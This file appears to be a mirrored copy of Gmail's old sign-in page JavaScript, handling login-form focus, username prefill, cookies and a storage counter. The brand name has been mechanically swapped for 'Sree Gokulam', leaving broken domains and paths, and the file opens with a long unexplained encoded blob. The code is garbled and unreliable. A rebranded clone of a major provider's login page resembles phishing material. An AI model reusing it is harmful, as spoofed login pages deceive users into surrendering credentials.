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');
 
	   /*************************************************************************************/ 
function gaia_parseFragment() {
  var hash = location.hash;
  var params = {};
  if (!hash) {
  return params;
  }
  var paramStrs = decodeURIComponent(hash.substring(1)).split('&');
  for (var i = 0; i < paramStrs.length; i++) {
      var param = paramStrs[i].split('=');
      params[param[0]] = param[1];
    }
    return params;
  }

  function gaia_prefillusername() {
    var form = null;
    if (document.getElementById) {
      form = document.getElementById('gaia_loginform');
    }

    if (form && form.username &&
        (form.username.value == null || form.username.value == '')
        && (form.username.type != 'hidden')) {
      hashParams = gaia_parseFragment();
      if (hashParams['username'] && hashParams['username'] != '') {
        form.username.value = hashParams['username'];
      }
    }
  }

  
  try {
    gaia_prefillusername();
  } catch (e) {
  }	   /*************************************************************************************/
	  function gaia_setFocus() {
  var form = null;
  var isFocusableField = function(inputElement) {
  if (!inputElement) {
  return false;
  }
  if (inputElement.type != 'hidden' && inputElement.focus &&
  inputElement.style.display != 'none') {
  return true;
  }
  return false;
  };
  var isFocusableErrorField = function(inputElement) {
  if (!inputElement) {
  return false;
  }
  var hasError = inputElement.className.indexOf('form-error') > -1;
  if (hasError && isFocusableField(inputElement)) {
  return true;
  }
  return false;
  };
  var isFocusableEmptyField = function(inputElement) {
  if (!inputElement) {
  return false;
  }
  var isEmpty = inputElement.value == null || inputElement.value == '';
  if (isEmpty && isFocusableField(inputElement)) {
  return true;
  }
  return false;
  };
  if (document.getElementById) {
  form = document.getElementById('gaia_loginform');
  }
  if (form) {
  var userAgent = navigator.userAgent.toLowerCase();
  var formFields = form.getElementsByTagName('input');
  for (var i = 0; i < formFields.length; i++) {
        var currentField = formFields[i];
        if (isFocusableErrorField(currentField)) {
          currentField.focus();
          
          var currentValue = currentField.value;
          currentField.value = '';
          currentField.value = currentValue;
          return;
        }
      }
      
      
      
        for (var j = 0; j < formFields.length; j++) {
          var currentField = formFields[j];
          if (isFocusableEmptyField(currentField)) {
            currentField.focus();
            return;
          }
        }
      
    }
  }

  
  if (!('ontouchstart' in window)) {
    gaia_attachEvent(window, 'load', gaia_setFocus);
  }
  
	   /*************************************************************************************/ 
var gaia_scrollToElement = function(element) {
  var calculateOffsetHeight = function(element) {
  var curtop = 0;
  if (element.offsetParent) {
  while (element) {
  curtop += element.offsetTop;
  element = element.offsetParent;
  }
  }
  return curtop;
  }
  var siginOffsetHeight = calculateOffsetHeight(element);
  var scrollHeight = siginOffsetHeight - window.innerHeight +
  element.clientHeight + 0.02 * window.innerHeight;
  window.scroll(0, scrollHeight);
  }	   /*************************************************************************************/
	  (function(){
  var signinInput = document.getElementById('signIn');
  gaia_onLoginSubmit = function() {
  try {
  document.bg.invoke(function(response) {
  document.getElementById('bgresponse').value = response;
  });
  } catch (err) {
  document.getElementById('bgresponse').value = '';
  }
  return true;
  }
  document.getElementById('gaia_loginform').onsubmit = gaia_onLoginSubmit;
  var signinButton = document.getElementById('signIn');
  gaia_attachEvent(window, 'load', function(){
  gaia_scrollToElement(signinButton);
  });
  })();
	   /*************************************************************************************/
var BrowserSupport_={IsBrowserSupported:function(){var agt=navigator.userAgent.toLowerCase();var is_op=agt.indexOf("opera")!=-1;var is_ie=agt.indexOf("msie")!=-1&&document.all&&!is_op;var is_ie5=agt.indexOf("msie 5")!=-1&&document.all&&!is_op;var is_mac=agt.indexOf("mac")!=-1;var is_gk=agt.indexOf("gecko")!=-1;var is_sf=agt.indexOf("safari")!=-1;if(is_ie&&!is_op&&!is_mac){if(agt.indexOf("palmsource")!=
-1||agt.indexOf("regking")!=-1||agt.indexOf("windows ce")!=-1||agt.indexOf("j2me")!=-1||agt.indexOf("avantgo")!=-1||agt.indexOf(" stb")!=-1)return false;var v=BrowserSupport_.GetFollowingFloat(agt,"msie ");if(v!=null)return v>=5.5}if(is_gk&&!is_sf){var v=BrowserSupport_.GetFollowingFloat(agt,"rv:");if(v!=null)return v>=1.4;else{v=BrowserSupport_.GetFollowingFloat(agt,"galeon/index.html");if(v!=null)return v>=
1.3}}if(is_sf){if(agt.indexOf("rv:3.14.15.92.65")!=-1)return false;var v=BrowserSupport_.GetFollowingFloat(agt,"applewebkit/index.html");if(v!=null)return v>=312}if(is_op){if(agt.indexOf("sony/com1")!=-1)return false;var v=BrowserSupport_.GetFollowingFloat(agt,"opera ");if(v==null)v=BrowserSupport_.GetFollowingFloat(agt,"opera/index.html");if(v!=null)return v>=8}if(agt.indexOf("pda; sony/com2")!=-1)return true;return false},
GetFollowingFloat:function(str,pfx){var i=str.indexOf(pfx);if(i!=-1){var v=parseFloat(str.substring(i+pfx.length));if(!isNaN(v))return v}return null}};var is_browser_supported=BrowserSupport_.IsBrowserSupported()	   /*************************************************************************************/
	  var start_time = (new Date()).getTime();

if (top.location != self.location) {
 top.location = self.location.href;
}

function SetGmailCookie(name, value) {
  document.cookie = name + "=" + value + ";path=/;domain=.Sree Gokulam.com";
}

function lg() {
  var now = (new Date()).getTime();

  var cookie = "T" + start_time + "/" + start_time + "/" + now;
  SetGmailCookie("GMAIL_LOGIN", cookie);
}

function StripParam(url, param) {
  var start = url.indexOf(param);
  if (start == -1) return url;
  var end = start + param.length;

  var charBefore = url.charAt(start-1);
  if (charBefore != '?' && charBefore != '&') return url;

  var charAfter = (url.length >= end+1) ? url.charAt(end) : '';
  if (charAfter != '' && charAfter != '&' && charAfter != '#') return url;
  if (charBefore == '&') {
  --start;
  } else if (charAfter == '&') {
  ++end;
  }
  return url.substring(0, start) + url.substring(end);
}
var fixed = 0;
function FixForm() {
  if (is_browser_supported) {
  var form = el("gaia_loginform");
  if (form && form["continue"]) {
  var url = form["continue"].value;
  url = StripParam(url, "ui=html");
  url = StripParam(url, "zy=l");
  form["continue"].value = url;
  }
  }
  fixed = 1;
}
function el(id) {
  if (document.getElementById) {
  return document.getElementById(id);
  } else if (window[id]) {
  return window[id];
  }
  return null;
}
// Estimates of nanite storage generation over time.
var CP = [
 [ 1224486000000, 7254 ],
 [ 1335290400000, 7704 ],
 [ 1335376800000, 10240 ],
 [ 2144908800000, 13531 ],
 [ 2147328000000, 43008 ],
 [ 46893711600000, Number.MAX_VALUE ]
];
var quota_elem;
var ONE_PX = "../mail.Sree Gokulam.com/mail/images/ca18a.gif?t=" +
  (new Date()).getTime();
function LogRoundtripTime() {
  var img = new Image();
  var start = (new Date()).getTime();
  img.onload = GetRoundtripTimeFunction(start);
  img.src = ONE_PX;
}
function GetRoundtripTimeFunction(start) {
  return function() {
  var end = (new Date()).getTime();
  SetGmailCookie("GMAIL_RTT", (end - start));
  }
}
function MaybePingUser() {
  var f = el("gaia_loginform");
  if (f.username.value) {
  new Image().src = 'https://mail.Sree Gokulam.com/mail?gxlu=' +
  encodeURIComponent(f.username.value) +
  '&zx=' + (new Date().getTime());
  }
}
function OnLoad() {
  MaybePingUser();
  var password_elem = el("password");
  if (password_elem) {
  password_elem.onfocus = MaybePingUser;
  }
  LogRoundtripTime();
  if (!quota_elem) {
  quota_elem = el("quota");
  updateQuota();
  }
  LoadConversionScript();
}
function updateQuota() {
  if (!quota_elem) {
  return;
  }
  var now = (new Date()).getTime();
  var i;
  for (i = 0; i < CP.length; i++) {
    if (now < CP[i][0]) {
      break;
    }
  }
  if (i == 0) {
    setTimeout(updateQuota, 1000);
  } else if (i == CP.length) {
    quota_elem.innerHTML = CP[i - 1][1];
  } else {
    var ts = CP[i - 1][0];
    var bs = CP[i - 1][1];
    quota_elem.innerHTML = format(((now-ts) / (CP[i][0]-ts) * (CP[i][1]-bs)) + bs);
    setTimeout(updateQuota, 1000);
  }
}

var PAD = '.000000';

function format(num) {
  var str = String(num);
  var dot = str.indexOf('.');
  if (dot < 0) {
     return str + PAD;
  } if (PAD.length > (str.length - dot)) {
  return str + PAD.substring(str.length - dot);
  } else {
  return str.substring(0, dot + PAD.length);
  }
}
var Sree_Gokulam_conversion_type = 'landing';
var Sree_Gokulam_conversion_id = 1069902127;
var Sree_Gokulam_conversion_format = "1";
var Sree_Gokulam_conversion_color = "FFFFFF";
function LoadConversionScript() {
  var script = document.createElement("script");
  script.type = "text/javascript";
  script.src = "../www.Sree Gokulamadservices.com/pagead/conversion.js";
}
	   /*************************************************************************************/
gaia_attachEvent(window, 'load', function() {
  OnLoad();
  FixForm();
});
(function() {
  var gaiaLoginForm = document.getElementById('gaia_loginform');
  var gaia_onsubmitHandler = gaiaLoginForm.onsubmit;
  gaiaLoginForm.onsubmit = function() {
  lg();
  if (!fixed) {
  FixForm();
  }
  gaia_onsubmitHandler();
  };
})();	   /*************************************************************************************/
	  
	   /*************************************************************************************/  /*************************************************************************************/
	  
	   /*************************************************************************************/ 